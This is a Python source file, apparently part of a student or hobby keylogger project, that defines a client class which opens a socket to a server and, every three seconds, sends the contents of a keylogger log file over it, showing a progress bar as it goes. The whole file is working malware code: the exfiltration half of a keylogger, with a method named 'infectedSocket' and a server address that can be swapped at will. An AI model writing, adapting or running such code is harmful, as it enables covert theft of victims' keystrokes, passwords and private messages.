import os,socket,time
from threading import Thread
from apscheduler.schedulers.background import BackgroundScheduler

class Client():

    def __init__(self,lock):
        self.BUFFER_SIZE = 1
        self.filename = "log.txt"
        self.filesize = os.path.getsize(self.filename)
        self.lock = lock
        self.sched = BackgroundScheduler()
        self.infectedSocket()

    def infectedSocket(self):
        """Connect to a server and start sharing data"""

        clt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        SERVER = '127.0.0.1'
        PORT = 22343
        clt.connect((SERVER, PORT))
        self.sched.add_job(self.send_file, 'interval', args=(clt,), seconds = 3)
        self.sched.start()
        
    def send_file(self,s):
        """Read the keylogger file line by line and send it to the server for process"""
        
        self.lock.acquire()
        with open(self.filename, "r") as f:
            assert self.BUFFER_SIZE > 0
            total = 0
  
            for line in f:
                s.send(bytes(line,"utf-8"))
                total += len(line)
                self.show_percentage(total/self.filesize)
        
        self.lock.release()


    def show_percentage(self,p):
        """Utility function to prettify output in cmd"""

        chops = 40
        if p > 1 or p < 0:
            print()
            return
        if p > 0.0:
            print('\r', end = '')

        s = int(p * chops)
        print('[{}]  {:5.2f}%'.format('=' * max(0, s-1) + ('>' if s > 0 else '') + ' ' * (chops - s), p*100), end = ('\n' if p == 1.0 else ''))

